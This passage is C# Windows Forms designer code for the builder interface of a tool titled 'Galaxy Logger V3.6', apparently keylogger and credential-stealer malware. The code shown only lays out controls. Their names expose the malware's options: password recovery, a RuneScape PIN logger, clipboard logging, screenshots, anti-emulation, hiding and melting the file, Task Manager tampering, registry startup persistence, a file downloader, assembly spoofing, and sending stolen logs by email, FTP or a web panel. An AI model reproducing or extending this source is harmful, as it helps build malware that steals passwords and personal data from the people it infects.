            this.cbChangeAssembly.Location = new System.Drawing.Point(26, 53);
            this.cbChangeAssembly.Name = "cbChangeAssembly";
            this.cbChangeAssembly.Size = new System.Drawing.Size(149, 19);
            this.cbChangeAssembly.TabIndex = 21;
            this.cbChangeAssembly.Text = "Change Assembly";
            // 
            // separator6
            // 
            this.separator6.Location = new System.Drawing.Point(26, 37);
            this.separator6.Name = "separator6";
            this.separator6.Size = new System.Drawing.Size(446, 10);
            this.separator6.TabIndex = 20;
            this.separator6.Text = "ambiance_Separator9";
            // 
            // lblAssembly
            // 
            this.lblAssembly.AutoSize = true;
            this.lblAssembly.BackColor = System.Drawing.Color.Transparent;
            this.lblAssembly.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblAssembly.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAssembly.Location = new System.Drawing.Point(24, 15);
            this.lblAssembly.Name = "lblAssembly";
            this.lblAssembly.Size = new System.Drawing.Size(77, 20);
            this.lblAssembly.TabIndex = 19;
            this.lblAssembly.Text = "Assembly";
            // 
            // frmBuilder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(765, 518);
            this.Controls.Add(this.themeContainer);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimumSize = new System.Drawing.Size(261, 65);
            this.Name = "frmBuilder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Galaxy Logger V3.6";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.frmBuilder_Load);
            this.themeContainer.ResumeLayout(false);
            this.panelMiscellaneous.ResumeLayout(false);
            this.panelMiscellaneous.PerformLayout();
            this.panelGeneral.ResumeLayout(false);
            this.panelGeneral.PerformLayout();
            this.panelPasswordRecovery.ResumeLayout(false);
            this.panelPasswordRecovery.PerformLayout();
            this.panelVaccine.ResumeLayout(false);
            this.panelVaccine.PerformLayout();
            this.panelBuild.ResumeLayout(false);
            this.panelBuild.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbIcon)).EndInit();
            this.panelInstallation.ResumeLayout(false);
            this.panelInstallation.PerformLayout();
            this.gbOther.ResumeLayout(false);
            this.gbStartup.ResumeLayout(false);
            this.gbInstallation.ResumeLayout(false);
            this.gbInstallation.PerformLayout();
            this.panelDelivery.ResumeLayout(false);
            this.panelDelivery.PerformLayout();
            this.gbWebPanel.ResumeLayout(false);
            this.gbFTP.ResumeLayout(false);
            this.gbEmail.ResumeLayout(false);
            this.panelDashboard.ResumeLayout(false);
            this.panelDashboard.PerformLayout();
            this.panelAbout.ResumeLayout(false);
            this.panelAbout.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbAbout)).EndInit();
            this.panelAssembly.ResumeLayout(false);
            this.panelAssembly.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private Ambiance_ThemeContainer themeContainer;
        private Ambiance_ControlBox btnControlBox;
        private System.Windows.Forms.ImageList ilPasswordRecovery;
        private System.Windows.Forms.PictureBox pbIcon;
        private System.Windows.Forms.Panel panelDashboard;
        private System.Windows.Forms.Panel panelDelivery;
        private System.Windows.Forms.TreeView tvMain;
        private System.Windows.Forms.ImageList ilTreeView;
        private System.Windows.Forms.Panel panelInstallation;
        private Ambiance_Button_1 btnTestDelivery;
        private Ambiance_NumericUpDown nudLogInterval;
        private Ambiance_Label lblLogInterval;
        private System.Windows.Forms.GroupBox gbWebPanel;
        private Amiance_TextBox tbWebPanelUploadKey;
        private System.Windows.Forms.GroupBox gbFTP;
        private Amiance_TextBox tbFTPPassword;
        private Amiance_TextBox tbFTPUsername;
        private Amiance_TextBox tbFTPServer;
        private Ambiance_RadioButton rbPanel;
        private Ambiance_RadioButton rbFTP;
        private Ambiance_RadioButton rbEmail;
        private System.Windows.Forms.GroupBox gbEmail;
        private Ambiance_CheckBox cbSSL;
        private Amiance_TextBox tbEmailPort;
        private Amiance_TextBox tbEmailServer;
        private Amiance_TextBox tbEmailPassword;
        private Amiance_TextBox tbEmailUsername;
        private Ambiance_Separator separator1;
        private Ambiance_HeaderLabel lblDeliveryMethod;
        private System.Windows.Forms.Panel panelGeneral;
        private System.Windows.Forms.Panel panelMiscellaneous;
        private System.Windows.Forms.Panel panelPasswordRecovery;
        private System.Windows.Forms.Panel panelAssembly;
        private System.Windows.Forms.Panel panelBuild;
        private System.Windows.Forms.ListView lvPasswordRecovery;
        private System.Windows.Forms.ColumnHeader chSoftware;
        private System.Windows.Forms.ColumnHeader chVersions;
        private Ambiance_Toggle cbPasswordRecovery;
        private Ambiance_Separator separator5;
        private Ambiance_HeaderLabel lblPasswordRecovery;
        private Ambiance_Label lblDelayExecution;
        private Ambiance_NumericUpDown nudDelayExecution;
        private Ambiance_CheckBox cbDelayExecution;
        private Amiance_TextBox tbMessageBoxBody;
        private Ambiance_ComboBox comboBoxMessageBoxType;
        private Ambiance_Label lblMessageBoxType;
        private Ambiance_CheckBox cbMessageBox;
        private Amiance_TextBox tbMessageBoxTitle;
        private Ambiance_ComboBox comboBoxFileType;
        private Ambiance_Label lblFileType;
        private Ambiance_CheckBox cbFileDownloader;
        private Amiance_TextBox tbFileDownloader;
        private Ambiance_Separator separator4;
        private Ambiance_HeaderLabel lblMiscellaneousSettings;
        private Ambiance_CheckBox cbClearSavedPasswords;
        private Ambiance_CheckBox cbRuneScapePinlogger;
        private Ambiance_CheckBox cbProcessProtection;
        private Ambiance_CheckBox cbAntiEmulation;
        private Ambiance_CheckBox cbCaptureScreenshots;
        private Ambiance_CheckBox cbMeltFile;
        private Ambiance_CheckBox cbModifyTaskManager;
        private Ambiance_CheckBox cbClipboardLogger;
        private Ambiance_Label lblMutex;
        private Amiance_TextBox tbMutex;
        private NSRandomPool randomPool;
        private Ambiance_Separator separator3;
        private Ambiance_HeaderLabel lblGeneralSettings;
        private System.Windows.Forms.GroupBox gbOther;
        private Ambiance_CheckBox cbHideFile;
        private Ambiance_CheckBox cbStartupPersistence;
        private System.Windows.Forms.GroupBox gbStartup;
        private Ambiance_CheckBox cbHKLM;
        private Ambiance_CheckBox cbHKCU;
        private Amiance_TextBox tbHKLM;
        private Amiance_TextBox tbHKCU;
        private System.Windows.Forms.GroupBox gbInstallation;
        private Amiance_TextBox tbProcess;
        private Ambiance_Label lblProcess;
        private Ambiance_ComboBox comboBoxDirectory;
        private Ambiance_Label lblSubfolder;
        private Amiance_TextBox tbSubfolder;
        private Ambiance_Label lblDirectory;
        private Ambiance_Toggle cbInstallation;
        private Ambiance_Separator separator2;
        private Ambiance_HeaderLabel lblInstallation;
        private System.Windows.Forms.Panel panelAbout;
        private System.Windows.Forms.PictureBox pbAbout;
        private Ambiance_Label lblAboutInfo;
        private Ambiance_Separator separator9;
        private Ambiance_HeaderLabel lblAbout;
        private System.Windows.Forms.Panel panelVaccine;
        private Ambiance_Label lblVaccineLog;
        private Ambiance_ListBox lbVaccineLog;
        private Ambiance_Button_1 btnRemoveKeylogger;
        private Ambiance_Label lblVaccineInfo;
        private Ambiance_Separator separator8;
        private Ambiance_HeaderLabel lblVaccine;
        private Ambiance_ListBox lbBuildLog;
        private Ambiance_Label lblBuildLog;
        private Ambiance_Button_1 btnBrowseIcon;
        private Amiance_TextBox tbIconPath;
        private Ambiance_CheckBox cbChangeIcon;
        private Ambiance_Separator separator7;
        private Ambiance_HeaderLabel lblBuild;
        private Ambiance_Button_1 btnBuild;
        private Ambiance_Label lblVersion;
        private Ambiance_Label lblCopyright;
        private Ambiance_Label lblProduct;
        private Ambiance_Label lblCompany;
        private Ambiance_Label lblDescriptionAsm;
        private Ambiance_Label lblTitle;
        private Amiance_TextBox tbVersion;
        private Amiance_TextBox tbCopyright;
        private Amiance_TextBox tbProduct;
        private Amiance_TextBox tbCompany;
        private Amiance_TextBox tbDescription;
        private Amiance_TextBox tbTitle;
        private Ambiance_CheckBox cbChangeAssembly;
        private Ambiance_Separator separator6;
        private Ambiance_HeaderLabel lblAssembly;
        private Ambiance_HeaderLabel ambiance_HeaderLabel2;
        private Ambiance_HeaderLabel ambiance_HeaderLabel1;
        private Ambiance_HeaderLabel ambiance_HeaderLabel4;
        private Ambiance_HeaderLabel ambiance_HeaderLabel3;
    }
}

